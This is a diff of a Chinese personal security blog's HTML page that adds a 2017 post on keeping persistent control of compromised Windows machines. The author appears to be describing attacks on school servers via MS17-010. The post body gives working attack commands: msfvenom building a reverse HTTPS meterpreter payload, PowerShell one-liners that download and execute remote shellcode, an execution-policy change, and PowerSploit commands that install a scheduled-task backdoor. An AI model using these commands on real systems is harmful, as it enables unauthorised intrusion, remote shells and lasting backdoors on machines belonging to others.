@@ -6,14 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: 渗透 | Halfblue</title>
+  <title>windows持续控制 | Halfblue</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Halfblue">
-<meta property="og:url" content="http://yoursite.com/tags/渗透/index.html">
+  <meta name="description" content="前一阵子的勒索病毒没传进学校，所以大家还是开开心心以为很安全，ms17010的洞也可以开开心心继续玩了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows持续控制">
+<meta property="og:url" content="http://yoursite.com/2017/05/21/windows持续控制/index.html">
 <meta property="og:site_name" content="Halfblue">
+<meta property="og:description" content="前一阵子的勒索病毒没传进学校，所以大家还是开开心心以为很安全，ms17010的洞也可以开开心心继续玩了。">
+<meta property="og:updated_time" content="2017-06-01T11:37:27.317Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Halfblue">
+<meta name="twitter:title" content="windows持续控制">
+<meta name="twitter:description" content="前一阵子的勒索病毒没传进学校，所以大家还是开开心心以为很安全，ms17010的洞也可以开开心心继续玩了。">
   
     <link rel="alternative" href="/atom.xml" title="Halfblue" type="application/atom+xml">
   
@@ -149,84 +153,45 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-windows持续控制" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/26/rw养生搞站/" class="archive-article-date">
-  	<time datetime="2018-11-26T13:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/26/rw养生搞站/">rw养生搞站</a>
+    <h1 class="article-title" itemprop="name">
+      windows持续控制
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">渗透</a>
-        </li>
-      
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-      
-        </div></section>
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/05/21/windows持续控制/" class="archive-article-date">
+        
+        <a href="/2017/05/21/windows持续控制/" class="archive-article-date">
   	<time datetime="2017-05-21T11:44:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-21</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/05/21/windows持续控制/">windows持续控制</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前一阵子的勒索病毒没传进学校，所以大家还是开开心心以为很安全，ms17010的洞也可以开开心心继续玩了。<a id="more"></a>不过学校的服务器是加强了防御，正好当时在香港，回来发现大清亡了，很难受。</p>
+<p>打江山易守江山难，研究了一下常见的权限控制方法。</p>
+<h3 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=4444 <span class="_">-f</span> powershell -o /var/www/html/<span class="built_in">test</span></div></pre></td></tr></table></figure>
+<p>先生成一个payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IEX(New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.110.129/CodeExecution/Invoke-Shellcode.ps1"</span>)</div><div class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.110.129/test"</span>)</div><div class="line">Invoke-Shellcode -Shellcode (<span class="variable">$buf</span>)</div></pre></td></tr></table></figure>
+<p>执行这三条反弹一个meterpreter</p>
+<p>有可能执行失败，显示没有脚本权限，在管理员权限下执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span>-ExecutionPolicy RemoteSigned</div></pre></td></tr></table></figure>
+<p>然后是后门</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$upo</span> = new-userpersistenceoption -scheduledtask -OnIdle</div><div class="line"><span class="variable">$epo</span> = new-elevatedpersistenceoption -scheduledtask -OnIdle</div><div class="line">add-persistence -filepath .\meter_443.ps1 -elevatedpersistenceoption <span class="variable">$epo</span> -userpersistenceoption <span class="variable">$upo</span></div></pre></td></tr></table></figure>
+<p>这几条命令生成一个Persistence.ps1，放到目标上执行就会写进计划任务，这是闲时，也可以hourly。理论上可以从web加载，那就方便不少，但我现在下载运行会报错，感觉很难用。</p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
 		<ul class="article-tag-list">
@@ -238,171 +203,97 @@
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/04/06/aspx站从注入到拉闸/" class="archive-article-date">
-  	<time datetime="2017-04-06T14:42:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/04/06/aspx站从注入到拉闸/">aspx站从注入到拉闸</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">渗透</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/03/06/openvasa使用排坑/" class="archive-article-date">
-  	<time datetime="2017-03-06T04:03:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/03/06/openvasa使用排坑/">openvasa使用排坑</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">渗透</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/03/01/服务器卡权限的绕过/" class="archive-article-date">
-  	<time datetime="2017-03-01T14:47:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/03/01/服务器卡权限的绕过/">服务器卡权限绕过</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">渗透</a>
-        </li>
       
-		</ul>
-	</div>
-
-          
-
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
   </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/05/一个接口爬全校师生信息/" class="archive-article-date">
-  	<time datetime="2017-01-05T02:33:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/05/一个接口爬全校师生信息/">一个接口爬全校师生工号</a>
-    </h1>
-  
+</div>
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">渗透</a>
-        </li>
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/05/21/windows持续控制/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2018/11/26/rw养生搞站/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          rw养生搞站
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2017/04/06/aspx站从注入到拉闸/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">aspx站从注入到拉闸</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
   
 
-    
+
 
 
           </div>
@@ -425,9 +316,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		root: "/",
